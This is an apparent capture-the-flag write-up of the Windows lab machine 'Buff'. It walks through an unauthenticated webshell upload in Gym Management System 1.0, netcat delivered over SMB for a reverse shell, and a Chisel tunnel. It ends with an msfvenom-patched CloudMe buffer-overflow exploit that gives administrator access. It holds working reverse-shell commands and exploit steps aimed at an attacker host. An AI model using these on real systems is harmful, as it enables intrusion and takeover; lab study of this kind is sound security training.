#Windows #CVE #GymManagementSoftware #RCE #chisel #tunneling #CloudMe #BufferOverflow #msfvenom

## Overview

Buff is an easy Windows box that strings together two CVEs and a pivot. The foothold is an unauthenticated RCE in **Gym Management System 1.0**, which drops a webshell. Because outbound payloads are locked down, I deliver `nc` over SMB to get a real shell as `shaun`. Privilege escalation is a classic pivot: a **CloudMe** instance listening only on localhost, reached through a **Chisel** reverse tunnel, then popped with a public buffer-overflow exploit to land as `administrator`.

## Recon

Port 8080 serves a gym site that advertises its own software and version:

```
mrb3n's Bro Hut — Made using Gym Management Software 1.0
```

A known-version fingerprint like that is a direct line to an exploit.

## Foothold

### Gym Management 1.0 Unauthenticated RCE

The [exploit](https://www.exploit-db.com/exploits/48506) uploads a PHP webshell via an unauthenticated file-upload bug. The ExploitDB script uploaded successfully but couldn't run commands for me, so I used [0xConstant's variant](https://github.com/0xConstant/Gym-Management-1.0-unauthenticated-RCE), which executes commands through a URL parameter on the uploaded shell:

```
http://10.129.106.143:8080/upload/kamehameha.php?telepathy=whoami
->  buff\shaun
```

> **Why the parameter matters:** the uploaded `kamehameha.php` reads a query-string parameter (`telepathy`) and passes it to the OS. So every command is just another GET request. It's RCE, but a clumsy one, no interactivity, and this box's command set was restricted enough that reverse-shell one-liners failed.

### SMB Delivery of netcat

Since I couldn't fetch tools over HTTP, I mounted a Kali SMB share on the target and copied `nc64.exe` across, then executed it, all through the webshell parameter:

```sh
impacket-smbserver -smb2support newShare . -username test -password test
```

```
?telepathy=net use z: \\10.10.14.126\newShare /u:test test
?telepathy=copy z:\nc64.exe .
?telepathy=.\nc64.exe 10.10.14.126 443 -e cmd
```

```sh
rlwrap nc -lvnp 443
C:\xampp\htdocs\gym\upload>whoami
buff\shaun
```

## Privilege Escalation

### Finding the Internal Service

Listing listening ports revealed two services bound to localhost only:

```
TCP  127.0.0.1:3306  Listening   mysqld.exe
TCP  127.0.0.1:8888  Listening   CloudMe
```

**CloudMe** on `8888` is the target, it has a well-known buffer overflow, but it's not reachable from outside the host.

### Chisel Reverse Tunnel

> **What the tunnel does:** the CloudMe port is firewalled to localhost, so I can't hit it from Kali directly. Chisel builds an encrypted tunnel: the target connects *out* to my Chisel server, and I tell it to forward the target's `localhost:8888` back to *my* `localhost:8888`. Now my exploit can target `127.0.0.1:8888` on Kali and reach CloudMe on the box.

```sh
# Kali (server)
chisel server -p 8000 --reverse
```

```powershell
# Target (client) — reverse-forward 8888
.\c.exe client 10.10.14.126:8000 R:8888:localhost:8888
```

`netstat` on Kali confirmed `8888` was now listening locally through the tunnel.

### CloudMe 1.11.2 Buffer Overflow

`searchsploit cloudme` pointed at the [1.11.2 BOF PoC](https://www.exploit-db.com/exploits/48389). I swapped the calc.exe shellcode for a reverse shell, bad-char filtered, targeting the tunneled port:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8080 -b '\x00\x0A\x0D' -f python -v payload
```

Running the exploit through the tunnel returned a shell as `administrator` (CloudMe runs with high privilege):

```sh
rlwrap nc -lvnp 8080
C:\Windows\system32>whoami
buff\administrator
```

## Root

Box rooted.

## Takeaways

- **Version strings are exploit shortcuts.** "Gym Management 1.0" mapped straight to an unauth RCE.
- **When egress is restricted, deliver tools over SMB** and execute via the webshell, `net use` + `copy` beats a blocked HTTP download.
- **Enumerate localhost-only services and tunnel to them.** Chisel reverse-forwarding turned an unreachable internal CloudMe into a local target, and a known BOF finished the job as admin.
